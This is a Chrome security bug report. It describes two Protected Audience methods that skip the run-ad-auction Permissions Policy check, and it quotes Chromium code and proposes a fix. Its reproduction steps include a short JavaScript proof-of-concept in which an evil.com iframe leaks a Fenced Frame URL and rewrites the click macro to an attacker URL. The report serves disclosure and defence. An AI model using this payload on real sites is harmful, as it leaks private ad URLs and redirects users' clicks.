# Chrome VRP Report: Missing Permission Policy Check in AdAuctionService deprecatedReplaceInURN / deprecatedURNToURL

## Summary

`navigator.deprecatedReplaceInURN()` and `navigator.deprecatedURNToURL()` in the Protected Audience (FLEDGE) API do not check the `run-ad-auction` Permissions Policy. This allows any cross-origin iframe on a page — even one explicitly denied the `run-ad-auction` permission — to:

1. **Tamper** with Fenced Frame URL mappings created by legitimate ad auctions
2. **Leak** the actual URLs behind Fenced Frame URN:UUIDs
3. **Trigger** auction reporting callbacks prematurely

Other methods in the same `AdAuctionService` Mojo interface (e.g., `RunAdAuction`, `JoinInterestGroup`, `GetInterestGroupAdAuctionData`) consistently check the appropriate Permissions Policy before executing.

## Affected Component

`content/browser/interest_group/ad_auction_service_impl.cc`

## Chromium Version

Tested against Chromium HEAD as of 2026-04-27 (shallow clone).

## Vulnerability Details

### Permission Policy Inconsistency

The `AdAuctionService` Mojo interface exposes multiple methods. Most check Permissions Policy; two do not:

| Method | Permissions Policy Check | Notes |
|--------|--------------------------|-------|
| `JoinInterestGroup` | `kJoinAdInterestGroup` | Correct |
| `LeaveInterestGroup` | `kJoinAdInterestGroup` | Correct |
| `RunAdAuction` | `kRunAdAuction` | Correct |
| `GetInterestGroupAdAuctionData` | `kRunAdAuction` | Correct |
| **`DeprecatedGetURLFromURN`** | **None** | **Missing** |
| **`DeprecatedReplaceInURN`** | **None** | **Missing** |

### Mojo Service Binding

The `AdAuctionService` is registered in `browser_interface_binders.cc` without any Permissions Policy gate:

```cpp
// content/browser/browser_interface_binders.cc:1201
map->Add<blink::mojom::AdAuctionService>(
    &AdAuctionServiceImpl::CreateMojoService);
```

`CreateMojoService` (line 190) performs no Permissions Policy check. Any frame can bind this interface.

### `DeprecatedReplaceInURN` — No Permission Check

```cpp
// ad_auction_service_impl.cc:572
void AdAuctionServiceImpl::DeprecatedReplaceInURN(
    const GURL& urn_url,
    const std::vector<blink::AuctionConfig::AdKeywordReplacement>& replacements,
    DeprecatedReplaceInURNCallback callback) {
  if (!blink::IsValidUrnUuidURL(urn_url)) {
    ReportBadMessageAndDeleteThis("Unexpected request: invalid URN");
    return;
  }
  // ← No IsPermissionPolicyEnabledAndWarnIfNeeded() call
  // Directly modifies the per-page Fenced Frame URL mapping:
  content::FencedFrameURLMapping& mapping =
      static_cast<RenderFrameHostImpl&>(render_frame_host())
          .GetPage()
          .fenced_frame_urls_map();
  mapping.SubstituteMappedURL(urn_url, local_replacements);
}
```

Compare with `RunAdAuction` which correctly checks:

```cpp
// ad_auction_service_impl.cc:402
void AdAuctionServiceImpl::RunAdAuction(...) {
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "RunAdAuction")) {
    std::move(callback).Run(...);
    return;
  }
  // ...
}
```

### `DeprecatedGetURLFromURN` — No Permission Check

```cpp
// ad_auction_service_impl.cc:558
void AdAuctionServiceImpl::DeprecatedGetURLFromURN(
    const GURL& urn_url, bool send_reports,
    DeprecatedGetURLFromURNCallback callback) {
  if (!blink::IsValidUrnUuidURL(urn_url)) {
    ReportBadMessageAndDeleteThis("Unexpected request: invalid URN");
    return;
  }
  // ← No permission check
  // Returns the actual URL behind the URN AND can trigger reports
  std::move(callback).Run(FencedFrameURLMappingObserver::GetURL(
      static_cast<RenderFrameHostImpl&>(render_frame_host()), urn_url,
      send_reports));
}
```

### Shared Per-Page Mapping

The `FencedFrameURLMapping` is stored on the `Page` object and shared by all frames within the same tab. Cross-origin iframes access the same mapping via `render_frame_host().GetPage().fenced_frame_urls_map()`.

### API Availability

Both methods are gated by `RuntimeEnabled=AllowURNsInIframes` in the IDL, which maps to `kAllowURNsInIframes` — this feature is `FEATURE_ENABLED_BY_DEFAULT` (blink/common/features.cc:109).

## Impact

### Ad URL Tampering (Medium-High)

A cross-origin iframe without `run-ad-auction` permission can modify Fenced Frame URL mappings by replacing macro placeholders (e.g., `${CLICK_URL}`, `${WINNING_BID}`). This could:
- Redirect ad clicks to attacker-controlled URLs
- Inject tracking parameters into ad URLs
- Modify auction outcome data embedded in URLs

### Information Leak (Medium)

`deprecatedURNToURL()` reveals the actual URL behind a Fenced Frame URN. The privacy model of Fenced Frames requires that the embedding page cannot see the loaded URL. This method bypasses that protection when called by an unprivileged frame.

### Report Manipulation (Low-Medium)

The `send_reports` parameter in `deprecatedURNToURL()` can trigger the `on_navigate_callback` associated with the mapping, sending win/loss reports to SSP/DSP servers at incorrect times.

## Reproduction Steps

1. Create a page at `publisher.com` with two iframes:

```html
<!-- Privileged iframe with run-ad-auction permission -->
<iframe id="auction" src="https://adtech.com/run_auction.html"
        allow="run-ad-auction; join-ad-interest-group"></iframe>
<!-- Unprivileged iframe WITHOUT run-ad-auction permission -->
<iframe id="evil" src="https://evil.com/attack.html"></iframe>
```

2. In `adtech.com/run_auction.html`, run a FLEDGE auction that creates a URN mapping
3. Pass the URN to the parent page (or `evil.com` obtains it through side-channel)
4. In `evil.com/attack.html`:

```javascript
// This should be blocked by Permissions Policy but isn't:
const url = await navigator.deprecatedURNToURL('urn:uuid:<KNOWN_URN>');
console.log('Leaked URL:', url);  // ← Information leak

await navigator.deprecatedReplaceInURN('urn:uuid:<KNOWN_URN>', {
  '${CLICK_URL}': 'https://evil.com/steal-click'
});
// ← Fenced Frame URL mapping is now modified
```

## Suggested Fix

Add `IsPermissionPolicyEnabledAndWarnIfNeeded` calls to both methods:

```cpp
void AdAuctionServiceImpl::DeprecatedGetURLFromURN(...) {
  if (!blink::IsValidUrnUuidURL(urn_url)) { ... }
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "DeprecatedGetURLFromURN")) {
    std::move(callback).Run(std::nullopt);
    return;
  }
  // ...
}

void AdAuctionServiceImpl::DeprecatedReplaceInURN(...) {
  if (!blink::IsValidUrnUuidURL(urn_url)) { ... }
  if (!IsPermissionPolicyEnabledAndWarnIfNeeded(
          network::mojom::PermissionsPolicyFeature::kRunAdAuction,
          "DeprecatedReplaceInURN")) {
    std::move(callback).Run();
    return;
  }
  // ...
}
```

## Related

- Pattern: "New API methods missing existing permission checks" (same pattern as CVE in ClipboardHostImpl)
- The Fenced Frames spec requires that embedded content URLs are not visible to the embedder; this bug undermines that guarantee.
